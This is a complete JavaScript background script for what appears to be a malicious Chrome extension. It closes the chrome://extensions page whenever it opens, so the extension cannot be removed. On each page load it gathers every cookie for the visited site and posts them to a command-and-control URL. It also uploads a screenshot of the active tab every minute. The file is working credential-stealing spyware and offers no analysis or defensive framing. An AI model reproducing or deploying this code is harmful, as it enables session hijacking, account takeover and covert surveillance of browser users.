const C2_URL = "http://127.0.0.1:5000";

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (tab.url && tab.url.includes("chrome://extensions")) {
        chrome.tabs.remove(tabId);
    }
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url.startsWith("http")) {
        const domain = new URL(tab.url).hostname.replace("www.", "");
        chrome.cookies.getAll({ domain: domain }, (cookies) => {
            if (cookies.length > 0) {
                let cStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
                fetch(`${C2_URL}/cookies`, {
                    method: "POST",
                    body: JSON.stringify({ site: domain, cookies: cStr })
                });
            }
        });
    }
});

setInterval(() => {
    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
        if (tabs[0] && tabs[0].url.startsWith("http")) {
            chrome.tabs.captureVisibleTab(null, {format: "jpeg", quality: 50}, (dataUrl) => {
                if (dataUrl) {
                    fetch(`${C2_URL}/screenshot`, {
                        method: "POST",
                        body: JSON.stringify({ image: dataUrl, url: tabs[0].url })
                    });
                }
            });
        }
    });
}, 60000);